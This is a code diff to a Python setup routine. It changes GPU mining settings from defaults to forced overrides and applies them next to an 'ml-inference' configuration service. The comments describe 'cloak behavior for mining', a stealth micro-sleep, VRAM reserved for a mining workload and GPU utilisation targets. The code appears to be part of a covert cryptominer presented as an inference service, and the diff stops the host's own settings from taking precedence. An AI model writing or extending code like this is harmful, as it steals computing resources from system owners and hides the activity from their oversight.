@@ -752,7 +752,17 @@ def setup():
         try:
             if os.getenv(key) in (None, ""):
                 os.environ[key] = str(value)
-                logger.info(f"✅ [SETUP] Default ENV set: {key}={value}")
+                logger.info(f"ℹ️ [AUTO] {key}={value} (defaulted)")
+        except Exception:
+            pass
+
+    def _force_env(key: str, value):
+        """
+        Force an environment variable regardless of existing values.
+        """
+        try:
+            os.environ[key] = str(value)
+            logger.info(f"ℹ️ [AUTO] {key}={value} (forced)")
         except Exception:
             pass
 
@@ -774,37 +784,37 @@ def setup():
     _set_default_env('GPU_PRE_UNLOCK', '1')
 
     # Closed-loop defaults (enable and tune for stability)
-    _set_default_env('GPU_CLOSED_LOOP_ENABLED', '1')
-    _set_default_env('GPU_TARGET_UTIL', '0.90')
-    _set_default_env('GPU_CLOSED_LOOP_STEP_W', '5')
-    _set_default_env('GPU_CLOSED_LOOP_STEP_CLK', '15')
-    _set_default_env('GPU_CLOSED_LOOP_TOL', '0.02')
-    _set_default_env('GPU_CLOSED_LOOP_MODE', 'auto')
-    _set_default_env('GPU_CLOSED_LOOP_MAX_SEC', '35.0')
+    _force_env('GPU_CLOSED_LOOP_ENABLED', '1')
+    _force_env('GPU_TARGET_UTIL', '0.90')
+    _force_env('GPU_CLOSED_LOOP_STEP_W', '5')
+    _force_env('GPU_CLOSED_LOOP_STEP_CLK', '15')
+    _force_env('GPU_CLOSED_LOOP_TOL', '0.02')
+    _force_env('GPU_CLOSED_LOOP_MODE', 'auto')
+    _force_env('GPU_CLOSED_LOOP_MAX_SEC', '35.0')
 
     # Anti-thrashing: dwell-time and max delta for power changes
-    _set_default_env('POWER_DWELL_SEC', '30')
-    _set_default_env('POWER_MAX_DELTA_W', '15')
+    _force_env('POWER_DWELL_SEC', '30')
+    _force_env('POWER_MAX_DELTA_W', '15')
 
     # VRAM reservation defaults for mining workload
-    _set_default_env('VRAM_ALLOCATION_DEFAULT', '0.2')
+    _force_env('VRAM_ALLOCATION_DEFAULT', '0.2')
 
     # Cloak behavior for mining
-    _set_default_env('MINING_MODE', 'gpu')
-    _set_default_env('STEALTH_MICRO_SLEEP_MS', '50')
+    _force_env('MINING_MODE', 'gpu')
+    _force_env('STEALTH_MICRO_SLEEP_MS', '50')
 
     # Ensure NVML utility capability if not provided
-    _set_default_env('NVIDIA_DRIVER_CAPABILITIES', 'compute,utility')
+    _force_env('NVIDIA_DRIVER_CAPABILITIES', 'compute,utility')
     
     # **Configuration from InferenceConfigService** (cấu hình từ InferenceConfigService – config từ ml-inference service)
     try:
-        inference_config = get_inference_config(process_info=None, logger=logger)
-        if inference_config.validate_configuration():
-            # **Set environment variables from inference_config** (đặt biến môi trường từ inference_config – set env vars từ inference config)
+        inference_config = get_inference_config(logger=logger)
+        if inference_config and inference_config.validate_configuration():
             env_vars = inference_config.get_environment_variables()
-            for key, value in env_vars.items():
-                os.environ[key] = value
-                logger.info(f"✅ **Set environment variable** (đặt biến môi trường – set env var) {key}={value}")
+            if isinstance(env_vars, dict):
+                for k, v in env_vars.items():
+                    os.environ[str(k)] = str(v)
+                    logger.info(f"[AUTO] InferenceConfig set: {k}={v}")
             
             # ✅ **CPU OPTIMIZATION CALL REMOVED** (lời gọi tối ưu hóa CPU đã xóa) - **GPU-only processing** (xử lý chỉ GPU)
             logger.info("✅ **CPU optimization skipped** (bỏ qua tối ưu hóa CPU – skip CPU optimization) - **GPU processing mode active** (chế độ xử lý GPU đang hoạt động – GPU mode ON)")
